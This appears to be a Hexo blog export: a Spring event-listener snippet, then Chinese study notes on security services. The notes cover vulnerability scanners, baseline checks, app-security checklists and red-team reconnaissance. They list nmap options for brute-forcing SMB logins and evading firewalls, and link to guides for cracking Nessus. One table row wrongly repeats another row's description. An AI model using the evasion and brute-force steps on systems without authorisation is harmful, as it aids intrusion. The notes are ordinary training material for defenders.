<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">context.publishEvent(T); 发事件</span><br><span class="line"><span class="meta">@EventListener</span> 收事件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">        context.publishEvent(<span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;hello , it&#x27;s me&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    String info;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Message&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;info=&#x27;&quot;</span> + info + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Message</span><span class="params">(String info)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.info = info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Compoment1</span> &#123;</span><br><span class="line">    <span class="meta">@EventListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testEventSendAndGet</span><span class="params">(Message message)</span>&#123;</span><br><span class="line">      log.info(message.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2024</span>-<span class="number">07</span>-16T19:<span class="number">26</span>:<span class="number">44.062</span>+08:<span class="number">00</span>  INFO <span class="number">21532</span> --- [alibabaStudy] [           main] com.example.alibabastudy.Compoment1      : Message&#123;info=<span class="string">&#x27;hello , it&#x27;</span>s me<span class="string">&#x27;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="2-容器实现"><a href="#2-容器实现" class="headerlink" title="2) 容器实现"></a>2) 容器实现</h2><ul>
<li>DefaultListableBeanFactory，是 BeanFactory 最重要的实现，像<strong>控制反转</strong>和<strong>依赖注入</strong>功能，都是它来实现</li>
<li>ClassPathXmlApplicationContext，从类路径查找 XML 配置文件，创建容器（旧）</li>
<li>FileSystemXmlApplicationContext，从磁盘路径查找 XML 配置文件，创建容器（旧）</li>
<li>XmlWebApplicationContext，传统 SSM 整合时，基于 XML 配置文件的容器（旧）</li>
<li>AnnotationConfigWebApplicationContext，传统 SSM 整合时，基于 java 配置类的容器（旧）</li>
<li>AnnotationConfigApplicationContext，Spring boot 中非 web 环境容器（新）</li>
<li>AnnotationConfigServletWebServerApplicationContext，Spring boot 中 servlet web 环境容器（新）</li>
<li>AnnotationConfigReactiveWebServerApplicationContext，Spring boot 中 reactive web 环境容器（新）</li>
</ul>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>源码</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>安服基本知识</title>
    <url>/2023/03/15/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<span id="more"></span>



<h2 id="安全服务认知"><a href="#安全服务认知" class="headerlink" title="安全服务认知"></a>安全服务认知</h2><p>keyword：安服项、彩虹计划、解决方案项、安全服务 交付文档规范</p>
<p>tips：不要借安全漏洞做坏事，安服要了解的东西很多</p>
<h3 id="技术类的交互"><a href="#技术类的交互" class="headerlink" title="技术类的交互"></a>技术类的交互</h3><p>给客户做培训类似的</p>
<h3 id="安全测试子类"><a href="#安全测试子类" class="headerlink" title="安全测试子类"></a>安全测试子类</h3><h3 id="咨询服务类"><a href="#咨询服务类" class="headerlink" title="咨询服务类"></a>咨询服务类</h3><p>滴滴被查，数据安全，数据怎么存更安全等。</p>
<p>sdl定义：<a href="https://zhuanlan.zhihu.com/p/252325178">分享|安全开发流程（SDL） - 知乎 (zhihu.com)</a></p>
<h3 id="培训服务类："><a href="#培训服务类：" class="headerlink" title="培训服务类："></a>培训服务类：</h3><p>等级保护对应了解：<a href="https://zhuanlan.zhihu.com/p/349827782">网络安全等级保护分几级？ - 知乎 (zhihu.com)</a></p>
<h3 id="安保服务类"><a href="#安保服务类" class="headerlink" title="安保服务类"></a>安保服务类</h3><h3 id="达到目的"><a href="#达到目的" class="headerlink" title="达到目的"></a>达到目的</h3><h3 id="安全服务要素"><a href="#安全服务要素" class="headerlink" title="安全服务要素"></a>安全服务要素</h3><h3 id="人员分类"><a href="#人员分类" class="headerlink" title="人员分类"></a>人员分类</h3><h3 id="树立网络安全"><a href="#树立网络安全" class="headerlink" title="树立网络安全"></a>树立网络安全</h3><h2 id="漏洞扫描实施"><a href="#漏洞扫描实施" class="headerlink" title="漏洞扫描实施"></a>漏洞扫描实施</h2><h3 id="AWVS使用"><a href="#AWVS使用" class="headerlink" title="AWVS使用"></a>AWVS使用</h3><p>安装参考链接：<a href="https://blog.csdn.net/anlr2020/article/details/118484169">AWVS14.1.2下载安装教程（2021.3.6版本）_awvs下载与安装_an1r的博客-CSDN博客</a></p>
<h4 id="基本设置"><a href="#基本设置" class="headerlink" title="基本设置"></a>基本设置</h4><p>在右上角进行设置，可以设置language为简体，看起来更加舒服</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316161733365.png" alt="image-20230316161733365"></p>
<p>左边显示的是菜单，因为刚刚开始用不是很熟练，就简单学下前面几个怎么使用：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316161943793.png"></p>
<h4 id="仪表盘"><a href="#仪表盘" class="headerlink" title="仪表盘"></a>仪表盘</h4><p>可以显示当前进行的扫描的进度，以及发现的漏洞的数量等</p>
<p>界面形如：<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162415536.png" alt="image-20230316162415536"></p>
<p>要看具体的漏洞，可以点击左边的扫描具体的看。</p>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162701525.png" alt="image-20230316162701525"></p>
<p>分为单个目标，多个目标，目标组</p>
<p>单个目标扫描一个目标，多个目标可以扫描多个目标。</p>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>显示对应的漏洞，具体看图</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316162926643.png" alt="image-20230316162926643"></p>
<h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><p>个人感觉最重要的一个tab</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316163005526.png" alt="image-20230316163005526"></p>
<p>可以看目标的状态，也可以新建扫描，可以看到扫的漏洞个数。</p>
<p>点击对应的url可以进入下面的界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230316163210196.png" alt="image-20230316163210196"></p>
<p>上面圈的可以更加详细的看到对应漏洞及说明，以及扫描出来的网页结构等。</p>
<h4 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h4><p>可以在扫描出生成报告，也可以在此次生成报告，报告种类很多种，暂时还不清楚不同报告类型的差别。</p>
<h3 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h3><h4 id="安装参考链接"><a href="#安装参考链接" class="headerlink" title="安装参考链接"></a>安装参考链接</h4><p><a href="https://www.52pojie.cn/thread-1650667-1-1.html">最详细破解nessus(windows)教程 插件更新至20220613 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.cnblogs.com/Cl0ud/p/13364718.html">Nessus破解没有Scan选项的解决办法 - 春告鳥 - 博客园 (cnblogs.com)</a></p>
<p>上面两个按照顺序弄即可弄好。</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230317085903303.png" alt="image-20230317085903303"></p>
<p>然后就可以开始使用了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/smli_ng/article/details/105976795</span><br><span class="line">https://zhuanlan.zhihu.com/p/464866605</span><br><span class="line"></span><br><span class="line">https://www.iculture.cc/software/pig=25546</span><br></pre></td></tr></table></figure>

<h3 id="明鉴扫描系统："><a href="#明鉴扫描系统：" class="headerlink" title="明鉴扫描系统："></a>明鉴扫描系统：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tool.chacuo.net/cryptaes</span><br><span class="line">aes ECB</span><br><span class="line">产品位置：RCwMiXieqCuESTnXAJRat5cujmQTZHAM6RY0Aufkhu7NAt3rsdWc0Nd0eWUIrxho</span><br><span class="line">明鉴系统镜像位置：RCwMiXieqCuESTnXAJRat5cujmQTZHAM6RY0Aufkhu4ylpJP8AtXUNvXEmb4QM4cEXYVygezOCuwuIoV6wXlIM09YaSGPyd7BiNkp+LGmHS3MEy6hvwp6BJdJbnWirhrurgxHKgWFFu5CkRPOFYssA==</span><br></pre></td></tr></table></figure>

<p><a href="https://bbs.dbappsecurity.com.cn/ahproduct">安恒产品 (dbappsecurity.com.cn)</a></p>
<p><a href="https://bbs.dbappsecurity.com.cn/productDetail?detailId=1636194071329329154&productType=download">明鉴漏洞扫描系统-V5.0R01C00SPC104-qcow2格式镜像 (dbappsecurity.com.cn)</a></p>
<p>扫描选桥接模式</p>
<h2 id="基线核查"><a href="#基线核查" class="headerlink" title="基线核查"></a>基线核查</h2><h3 id="基线核查流程"><a href="#基线核查流程" class="headerlink" title="基线核查流程"></a>基线核查流程</h3><p>前期：信息收集。<br>中期：实施阶段。现场检查。<br>后期：报告编写。</p>
<p><del>感觉主要是根据报告模板一个一个检查</del></p>
<h3 id="基线核查方式"><a href="#基线核查方式" class="headerlink" title="基线核查方式"></a>基线核查方式</h3><p>检查方式：</p>
<h4 id="基线检查平台（公司内部平台）："><a href="#基线检查平台（公司内部平台）：" class="headerlink" title="基线检查平台（公司内部平台）："></a>基线检查平台（公司内部平台）：</h4><p>登录对应平台下载工具进行使用。</p>
<ul>
<li>下载脚本</li>
<li>看readme，然后执行命令</li>
<li>之前会生成result，新建项目导入之前的result。</li>
<li>可以生成对应报告，然后对报告进行修改。</li>
</ul>
<h4 id="人工检查："><a href="#人工检查：" class="headerlink" title="人工检查："></a>人工检查：</h4><p>根据手册的checklist进行检查</p>
<p>tips：检查数据库类似的东西小心点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">主机评估-winodws、linux、AIX、HP-UNIX等</span><br><span class="line">网络设备评估-Cisco、H3C、中兴等</span><br><span class="line">其它设备评估-FTP</span><br><span class="line">数据库评估-Oracle-unix、mysql等</span><br><span class="line">中间件评估-Tomcat、Apache、IIS、Nginx</span><br></pre></td></tr></table></figure>

<h4 id="远程评估系统："><a href="#远程评估系统：" class="headerlink" title="远程评估系统："></a>远程评估系统：</h4><p>略</p>
<h3 id="常见问题及处置"><a href="#常见问题及处置" class="headerlink" title="常见问题及处置"></a>常见问题及处置</h3><p>资产数量大，往往涉及几百台主机。<br>非常规安装，找不到部署目录。<br>输入查询命令，返回为空。<br>软件更新较快，检查版本与客户版本不符合。<br>软件版本差异，部分检查项新版本已无相关配置。发现问题，提出建议后，但软件已无相关配置项。</p>
<h2 id="web安全测试实施"><a href="#web安全测试实施" class="headerlink" title="web安全测试实施"></a>web安全测试实施</h2><p>主要贴图时要清楚</p>
<p>略</p>
<h2 id="互联网敏感信息泄露"><a href="#互联网敏感信息泄露" class="headerlink" title="互联网敏感信息泄露"></a>互联网敏感信息泄露</h2><h3 id="信息资产梳理"><a href="#信息资产梳理" class="headerlink" title="信息资产梳理"></a>信息资产梳理</h3><h4 id="web网站"><a href="#web网站" class="headerlink" title="web网站"></a>web网站</h4><p>子域名收集：挖掘机等</p>
<h4 id="互联网接口（API）"><a href="#互联网接口（API）" class="headerlink" title="互联网接口（API）"></a>互联网接口（API）</h4><p>官方站点搜索<br> 搜索引擎<br> github</p>
<h4 id="APP应用"><a href="#APP应用" class="headerlink" title="APP应用"></a>APP应用</h4><p>官网<br> 安卓&#x2F;IOS应用商店搜索<br> 搜索引擎</p>
<h4 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h4><p>微信搜索：<a href="https://weixin.sogou.com/">搜狗微信搜索_订阅号及文章内容独家收录，一搜即达 (sogou.com)</a><br> 官网<br> 小程序收录平台</p>
<h4 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h4><p>微信搜索<br> 搜狗搜索<br> 官网</p>
<h3 id="信息泄露情况排查"><a href="#信息泄露情况排查" class="headerlink" title="信息泄露情况排查"></a>信息泄露情况排查</h3><h4 id="敏感信息排查"><a href="#敏感信息排查" class="headerlink" title="敏感信息排查"></a>敏感信息排查</h4><p>网络拓扑、账户&#x2F;密码、邮箱：网盘、github</p>
<h4 id="互联网敏感内容排查"><a href="#互联网敏感内容排查" class="headerlink" title="互联网敏感内容排查"></a>互联网敏感内容排查</h4><p>百度文库、招聘网站、招投标网站</p>
<h4 id="源代码泄露排查"><a href="#源代码泄露排查" class="headerlink" title="源代码泄露排查"></a>源代码泄露排查</h4><p>svn、github、csdn</p>
<h2 id="渗透测试实施"><a href="#渗透测试实施" class="headerlink" title="渗透测试实施"></a>渗透测试实施</h2><p>略（报告模板</p>
<h2 id="APP安全测试"><a href="#APP安全测试" class="headerlink" title="APP安全测试"></a>APP安全测试</h2><p>有报告，简单记录下有哪些检查：</p>
<h4 id="客户端环境安全"><a href="#客户端环境安全" class="headerlink" title="客户端环境安全"></a>客户端环境安全</h4><table>
<thead>
<tr>
<th align="center">客户端环境安全</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">安全完整性校验</td>
<td align="center">测试客户端是否存在完整性校验。如果iOS APP客户端未进行完整性校验，攻击者可以通过篡改客户端程序，对普通用户进行钓鱼等攻击。</td>
</tr>
<tr>
<td align="center">反编译保护（可选）</td>
<td align="center">可执行文件可以被反编译。攻击者可通过该问题看到客户端的逻辑。</td>
</tr>
<tr>
<td align="center">日志敏感信息泄露</td>
<td align="center">如果开发人员在日志中打印信息，则可能造成内网ip、用户名、密码、内部链接等敏感信息泄露。</td>
</tr>
<tr>
<td align="center">应用数据存储安全</td>
<td align="center">检查客户端程序本地存储文件，防止账号密码等敏感信息保存在本地，造成敏感信息泄露的风险。</td>
</tr>
<tr>
<td align="center">越狱环境检测</td>
<td align="center">越狱的环境默认是不安全的，是打破了苹果的生态系统的。如果应用未能在运行之初就检测当前系统是否为越狱环境，那么就会存在一定的风险。</td>
</tr>
<tr>
<td align="center">动态调试检测（可选）</td>
<td align="center">若客户端允许动态调试，攻击者可通过对客户端进行加解密分析、业务流程分析等。</td>
</tr>
<tr>
<td align="center">内存敏感信息检测</td>
<td align="center">一些重要数据，会被临时存放在内存里面。通过读取客户端内存，寻找内存中可能存在的敏感信息（卡号、明文密码等）。</td>
</tr>
<tr>
<td align="center">输入记录保护</td>
<td align="center">在系统中安装了键盘记录软件（可以在非越狱状态运行），则使用系统键盘输入的内容易被键盘记录程序记录，导致内容泄露。</td>
</tr>
<tr>
<td align="center">屏幕录像保护</td>
<td align="center">测试通过截图功能，是否可以截到用户密码输入框（登录密码、交易密码等）的明文密码。</td>
</tr>
</tbody></table>
<h3 id="网络通信安全"><a href="#网络通信安全" class="headerlink" title="网络通信安全"></a>网络通信安全</h3><table>
<thead>
<tr>
<th align="center">网络通信安全</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">通信协议安全</td>
<td align="center">APP使用HTTP协议进行通信过程中可能会遭受中间人攻击，威胁数据安全。</td>
</tr>
<tr>
<td align="center">通信数据加密</td>
<td align="center">查看客户端在登录&#x2F;找回密码等关键业务的报文，是否对报文整体，或关键字段进行加密。</td>
</tr>
<tr>
<td align="center">证书强校验检测</td>
<td align="center">验证客户端是否存在忽略服务端证书校验的问题，客户端没有对服务器进行强校验或者没有在校验错误时候对用户进行提示，攻击者可以通过伪造证书对服务器进行攻击。</td>
</tr>
<tr>
<td align="center">软件升级缺陷</td>
<td align="center">程序在进行版本更新的时候，会向服务器请求一个跳转地址，如果修改返回包中的地址，存在钓鱼攻击的风险。</td>
</tr>
</tbody></table>
<h3 id="安全策略检测"><a href="#安全策略检测" class="headerlink" title="安全策略检测"></a>安全策略检测</h3><table>
<thead>
<tr>
<th align="center">安全策略检测</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">软键盘随机化排布</td>
<td align="center">在用户输入敏感信息时，如果系统未使用自定义软键盘，而是使用了系统自带键盘，或者自定义软键盘未随机，那么恶意程序就可能对屏幕点击进行劫持，导致用户敏感信息泄露。</td>
</tr>
<tr>
<td align="center">后台背景模糊</td>
<td align="center">在切换至多任务状态栏时，APP背景内容是否模糊处理，防止敏感信息泄露。</td>
</tr>
<tr>
<td align="center">手势密码检测</td>
<td align="center">检测APP内手势密码的复杂度要求，手势密码修改是否需要校验密码，本地是否存储了明文手势密码的信息等。</td>
</tr>
<tr>
<td align="center">密码修改验证</td>
<td align="center">检测是否需要输入旧密码验证来修改密码。</td>
</tr>
<tr>
<td align="center">密码复杂度检验</td>
<td align="center">通常客户端没有设置禁止修改口令的强弱判断，导致用户有时贪图方便修改成简单密钥使攻击者容易通过弱口令进入帐号进行非法操作。</td>
</tr>
<tr>
<td align="center">认证失败锁定</td>
<td align="center">测试账户在登录时候多次输入密码错误或修改密码时候多次错误是否会导致账号被锁定。</td>
</tr>
<tr>
<td align="center">UI敏感信息安全</td>
<td align="center">登录过程中会为了友好，提示“用户名错误”或者“密码错误”。此时就可以通过这种“友好”的提示检查项目是否存在相关用户名，并且在账号体系不存在锁定的情况下相对容易地进行密码爆破。</td>
</tr>
<tr>
<td align="center">信息屏蔽检测</td>
<td align="center">检测程序中显示敏感信息是否使用 * 进行部分屏蔽，防止在被截屏获取敏感信息，同时也防止他人窥探手机屏幕得到敏感信息。</td>
</tr>
<tr>
<td align="center">会话超时策略</td>
<td align="center">程序在长时间不操作时候或者在长时间，若程序没有自动锁定或者退出登录，则有可能导致在这种情况下造成数据窃取。</td>
</tr>
<tr>
<td align="center">会话固定风险</td>
<td align="center">程序在进行正常退出之后如果后台不消除相关的用户身份凭证，则在身份凭证被窃取之后容易造成会话固定问题。</td>
</tr>
<tr>
<td align="center">锁屏与会话锁定策略</td>
<td align="center">测试程序在锁屏解锁之后是否会进行会话锁定，并在重新解锁之后要求用户重新进行身份验证。</td>
</tr>
<tr>
<td align="center">TLS&#x2F;SSL协议与加密套件</td>
<td align="center">程序在进行正常退出之后如果后台不消除相关的用户身份凭证，则在身份凭证被窃取之后容易造成会话固定问题。</td>
</tr>
</tbody></table>
<h2 id="威胁分析与处置"><a href="#威胁分析与处置" class="headerlink" title="威胁分析与处置"></a>威胁分析与处置</h2><p>主要解释了平台怎么使用。</p>
<p>APT：高级持续性威胁（Advanced Persistent Threat，APT），又叫高级长期威胁，是一种复杂的、持续的网络攻击，包含三个要素：高级、长期、威胁。高级是指执行APT攻击需要比传统攻击更高的定制程度和复杂程度，需要花费大量时间和资源来研究确定系统内部的漏洞；长期是为了达到特定目的，过程中“放长线”，持续监控目标，对目标保有长期的访问权；威胁强调的是人为参与策划的攻击，攻击目标是高价值的组织，攻击一旦得手，往往会给攻击目标造成巨大的经济损失或政治影响，乃至于毁灭性打击。</p>
<p>参考：<a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%80%A7%E5%A8%81%E8%83%81.html</a></p>
<p><a href="https://www.zhihu.com/question/28881041">https://www.zhihu.com/question/28881041</a></p>
<h2 id="应急响应分析"><a href="#应急响应分析" class="headerlink" title="应急响应分析"></a>应急响应分析</h2><p>视频包括模板介绍及案例分析</p>
<p><a href="https://bypass007.github.io/Emergency-Response-Notes/">前言 · 应急响应实战笔记 (bypass007.github.io)</a>  这个说得特别详细</p>
<p>下面是部分介绍应急响应的链接：</p>
<p><a href="https://www.freebuf.com/articles/terminal/192859.html">https://www.freebuf.com/articles/terminal/192859.html</a></p>
<p><a href="https://www.cnblogs.com/fox-yu/p/14380849.html">https://www.cnblogs.com/fox-yu/p/14380849.html</a></p>
<p><a href="https://www.freebuf.com/column/206886.html">应急响应实战案例分享 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://www.freebuf.com/column/206886.html">应急响应实战案例分享 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/weixin_40412037/article/details/114282426">一次真实的应急响应案例——篡改页面、挖矿(sysupdate、networkservice)（含靶场环境）_应急响应靶场_W小哥1的博客-CSDN博客</a></p>
<p><a href="https://www.freebuf.com/articles/web/216939.html">应急响应实例分享 - FreeBuf网络安全行业门户</a></p>
<h2 id="网络探针"><a href="#网络探针" class="headerlink" title="网络探针"></a>网络探针</h2><p>什么是网络探针？网络探针是接入控制的有效手段！网络探针就是一个被赋予了特殊功能的BTA桌面安全助理程序，它能够检测到在特定的网络区间内（一般为内网的同一C类网段）没有安装和运行BTA桌面安全助理程序的其它计算机，并采取技术措施自动限制或阻断这些计算机的网络通信。这些操作是由网络探针自动完成的，不需要管理人员的手工操作，也不需要对相关网络设备的配置进行修改。</p>
<p>人会说谎，流量不会 </p>
<p><a href="https://blog.csdn.net/Aubergine_kang/article/details/83905614#:~:text=%E7%BD%91%E7%BB%9C%E6%8E%A2%E9%92%88%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA,%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E3%80%82">https://blog.csdn.net/Aubergine_kang/article/details/83905614#:~:text=%E7%BD%91%E7%BB%9C%E6%8E%A2%E9%92%88%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA,%E7%AE%97%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1%E3%80%82</a></p>
<h2 id="红队-信息收集进阶"><a href="#红队-信息收集进阶" class="headerlink" title="红队-信息收集进阶"></a>红队-信息收集进阶</h2><p>ATT&amp;CK：<a href="https://blog.csdn.net/weixin_43965597/article/details/125926620%EF%BC%88%E6%B2%A1%E4%BB%94%E7%BB%86%E7%A0%94%E7%A9%B6%E8%BF%99%E4%B8%AA%EF%BC%8C%E4%BB%A5%E5%90%8E%E9%9C%80%E8%A6%81%E5%86%8D%E7%9C%8B%EF%BC%89">https://blog.csdn.net/weixin_43965597/article/details/125926620（没仔细研究这个，以后需要再看）</a></p>
<h3 id="OSINT简介"><a href="#OSINT简介" class="headerlink" title="OSINT简介"></a>OSINT简介</h3><p>开源网络情报(Open source intelligence),简称OSINT,是美国中央情报局(CIA)的一种情报搜集手段，从各种公开的信息资源中寻找和获取有价值的情报OSINT特点：因为开源、宽泛；各类情报&#x2F;信息都可收集</p>
<p>之后看酷学院补充</p>
<h3 id="端口扫描-nmap-amp-masscan"><a href="#端口扫描-nmap-amp-masscan" class="headerlink" title="端口扫描-nmap&amp;masscan"></a>端口扫描-nmap&amp;masscan</h3><p>url链接：https:&#x2F;nmap.org&#x2F;<br>Nmap可以扫ip可以扫域名，<br>-V显示扫描过程；<br>-A进攻式扫描；<br>-p1-65535,全端：<br>O探测操作系统：<br>-nP不用ping；<br>-Pn&#x3D;-P0不进行主机发现直接扫描：<br>-top-ports100排名前100端口；<br>-iL filename从文件中读取目标进行扫描：<br><strong>扫描方式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sT TCP扫描（稳定，相较于SYN次选），三次握手；</span><br><span class="line">-sS用SYN扫描（速度快、隐蔽），半开放式扫描，无完整握手；</span><br><span class="line">-sU用UDP扫描（扫描慢）；</span><br><span class="line">-sA用ACK扫描；</span><br><span class="line">-sX用Xmas扫描；</span><br><span class="line">-sF用FIN扫描（可绕过一些防火墙）；</span><br><span class="line">-sP用ping,确认主机是否在线；</span><br><span class="line">-sV扫描主机和端口的版本</span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-script部分漏洞利用</span><br><span class="line">-script all使用所有脚本进行扫描</span><br><span class="line">-script auth自动识别</span><br><span class="line">-script vuln对常见漏洞扫描</span><br><span class="line">--script smb-brute对用户名密码进行爆破</span><br></pre></td></tr></table></figure>

<p><strong>绕防火墙：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-DRND:10(随机产生10个虚拟ip对目标进行扫描)</span><br><span class="line">-f发送很小的包（类似mtu)</span><br><span class="line">-mtu8(8、16、24、32等8的倍数)</span><br><span class="line">-S源地址伪装</span><br><span class="line">-source-port53用53端口对目标进行扫描</span><br><span class="line">-data-length20发送指定长度的包去探测</span><br><span class="line">-sI agent-ip以agent-ip的身份去扫描（默认80端口）</span><br></pre></td></tr></table></figure>

<h4 id="subfinder"><a href="#subfinder" class="headerlink" title="subfinder"></a>subfinder</h4><p>url链接：https:&#x2F;github.com&#x2F;projectdiscovery&#x2F;subfinder<br>功能：通过调用各个api接口进行子域名收集（调用包括Sublist3r、crtsh、fofa、spyses等等）</p>
<p>（没用过，以后有机会试试，一般我用layer</p>
<h4 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h4><p>url链接：https:&#x2F;github.com&#x2F;shmilylty.&#x2F;OneForAll<br>功能：通过DNS、搜索引擎、爬子域等方式进行检索</p>
<h4 id="Sublist3r-amp-子域名挖掘机"><a href="#Sublist3r-amp-子域名挖掘机" class="headerlink" title="Sublist3r&amp;子域名挖掘机"></a>Sublist3r&amp;子域名挖掘机</h4><p>url链接：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a>  功能：通过搜索引擎爬取，多了一个检查端口</p>
<p>url链接：<a href="https://www.webshell.cc/6384.htm">https://www.webshell.cc/6384.htm</a>  功能：输入直接查询子域名（爆破枚举</p>
<h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p>内容安全策略(CSP):开发者明确告诉客户端（制定比较严格的策略和规侧）<br>内容安全策略(CSP)定义了Content-Security-Policy HTTP头，它允许我们创建可信内容源的白名单，并指示浏览器只执行或呈现来自这些源的资源<br>我们可以查看HTTP的Content-Security-Policy:字段来搜集子域名信息。</p>
<h4 id="whois-x2F-DNS查询-centralops"><a href="#whois-x2F-DNS查询-centralops" class="headerlink" title="whois&#x2F;DNS查询-centralops"></a>whois&#x2F;DNS查询-centralops</h4><p>url链接：<a href="https://centralops.net/co/DomainDossier.aspx">https://centralops.net/co/DomainDossier.aspx</a></p>
<h4 id="whois-x2F-DNS查询-dnsdumpster"><a href="#whois-x2F-DNS查询-dnsdumpster" class="headerlink" title="whois&#x2F;DNS查询-dnsdumpster"></a>whois&#x2F;DNS查询-dnsdumpster</h4><p>url链接：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>功能：查询DNS解析记录，其中里面包含其他接口（如：查询共享DNS主机、共享IP主机、端口探测等端口)，但是会招出查询次数</p>
<h4 id="ip反查域名-rapiddns"><a href="#ip反查域名-rapiddns" class="headerlink" title="ip反查域名-rapiddns"></a>ip反查域名-rapiddns</h4><p>url链接：<a href="https://rapiddns.io/">https://rapiddns.io/</a><br>功能：查询ip归属地、网络中心，反查网站、旁站C段查询</p>
<h4 id="ip反查域名-IP138"><a href="#ip反查域名-IP138" class="headerlink" title="ip反查域名-IP138"></a>ip反查域名-IP138</h4><p>url链接：<a href="https://www.ip138.com/iplookup.asp">https://www.ip138.com/iplookup.asp</a><br>功能：查询同IP下都有哪些web站点</p>
<h4 id="CDN-chinaz"><a href="#CDN-chinaz" class="headerlink" title="CDN-chinaz"></a>CDN-chinaz</h4><p>url链接：<a href="https://cdn.chinaz.com/">https://cdn.chinaz.com/</a><br>功能：查询是否有CDN及CDN提供商名字</p>
<h4 id="数字证书-censys-amp-crt-sh"><a href="#数字证书-censys-amp-crt-sh" class="headerlink" title="数字证书-censys&amp;crt.sh"></a>数字证书-censys&amp;crt.sh</h4><p>url链接：<a href="https://search.censys.io/">https://search.censys.io/</a><br>选择证书查询即可，可查询自签名，过期证书、未过期证书、发行人，以及邮箱</p>
<p>url链接：<a href="https://crt.sh/">https://crt.sh/</a><br>属于域名即可查询</p>
